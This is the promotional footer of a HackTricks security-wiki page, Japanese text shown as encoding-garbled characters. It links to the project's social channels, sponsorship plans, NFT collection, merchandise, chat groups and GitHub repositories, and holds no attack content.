<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ã‚ãªãŸã¯**ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
